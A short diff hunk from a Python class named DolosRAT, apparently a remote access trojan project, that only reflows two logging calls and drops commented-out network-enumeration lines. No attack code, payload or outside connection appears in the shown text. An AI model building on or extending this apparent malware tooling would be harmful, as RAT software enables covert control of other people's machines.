@@ -109,12 +109,15 @@ class DolosRAT:
         With handles created for the classes pertinent
         to the application, use these to commence DolosRAT.
         """
-        self._logger.write_log("DolosRAT initialisation started.", LoggerLevel.INFO)
+        self._logger.write_log(
+            "DolosRAT initialisation started.", 
+            LoggerLevel.INFO
+        )
 
-        # IfaWrapper initialisation.
-        # self._logger.write_log("Enumerated network configuration and interfaces.", LoggerLevel.INFO)
-
-        self._logger.write_log(f"DolosRAT initialised in {time.time() - self._strt_time}", LoggerLevel.INFO)
+        self._logger.write_log(
+            f"DolosRAT initialised in {time.time() - self._strt_time}", 
+            LoggerLevel.INFO
+        )
 
     def start(self: object) -> None:
         """Exposed method for 'starting' DolosRAT.
